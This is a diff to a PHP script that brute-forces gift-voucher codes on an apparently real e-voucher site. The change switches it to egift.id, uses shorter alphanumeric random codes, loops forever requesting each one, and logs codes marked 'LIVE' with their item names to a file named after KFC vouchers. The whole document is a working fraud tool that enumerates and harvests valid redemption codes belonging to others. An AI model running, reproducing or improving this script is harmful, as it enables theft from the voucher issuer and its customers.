@@ -58,7 +58,7 @@ class curl {
 }
 function x($length)
 {
-    $data = '1234567890';
+    $data = '1234567890qwertyuiopasdfghjklzxcvbnm';
     $string = '';
     for($i = 0; $i < $length; $i++) {
         $pos = rand(0, strlen($data)-1);
@@ -70,19 +70,19 @@ $curl = new curl();
 $curl->ssl(0, 2);	
 $i=0;
 while (true) {	
-$tod = x(12);
-$page = $curl->get('http://e-egift.id/redeem.php?code='.$tod.'');
+$tod = x(8);
+$page = $curl->get('http://egift.id/'.$tod.'');
 	if (stripos($page, 'h1 style="top: 0;">')) {
 				preg_match_all('/<span id="p_item_name">(.*?)<\/span>/', $page, $nom);
-		echo ''.$i.'.LIVE => http://e-egift.id/redeem.php?code='.$tod.' | '.$nom[1][0].'';
-		$data =  "http://e-egift.id/redeem.php?code=".$tod." | '.$nom[1][0].' \r\n";
+		echo ''.$i.'.LIVE => http://egift.id/'.$tod.' | '.$nom[1][0].'';
+		$data =  "http://egift.id/".$tod." | '.$nom[1][0].' \r\n";
 		$fh = fopen("cdy-kfc.txt", "a");
 		fwrite($fh, $data);
 		fclose($fh);
 									echo "\n";
 	}else	if (stripos($page, '<h1>E-VOUCHER</h1>')) {
 
-		echo ''.$i.'.DIE => http://e-egift.id/redeem.php?code='.$tod.'';
+		echo ''.$i.'.DIE => http://egift.id/'.$tod.'';
 									echo "\n";
 	}else{
 		echo ' ERROR '.$tod;
